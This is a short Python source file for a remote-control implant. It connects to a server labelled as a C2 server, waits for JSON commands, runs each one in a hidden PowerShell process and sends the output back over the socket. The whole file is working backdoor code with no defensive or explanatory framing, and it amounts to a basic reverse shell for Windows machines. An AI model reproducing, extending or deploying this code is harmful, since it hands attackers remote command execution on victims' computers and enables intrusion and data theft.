import socket, os, threading, subprocess, json, time, sys

HOST = "127.0.0.1" # C2 Server IP
PORT = 6969 # C2 application port


def send_data(conn, data):
    """Sends data back to the C2 server"""
    data = json.dumps(data)
    conn.send(data.encode())

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT)) # Connect to the C2 server
    while True:
        data = json.loads(sock.recv(1024).decode())
        print(data)
        match data[0]:
            case "command":
                proc = subprocess.Popen('powershell.exe', stdin = subprocess.PIPE, stdout = subprocess.PIPE)
                output, error = proc.communicate(data[1].encode())
                time.sleep(0.5)
                print(output)
                send_data(sock, output.decode())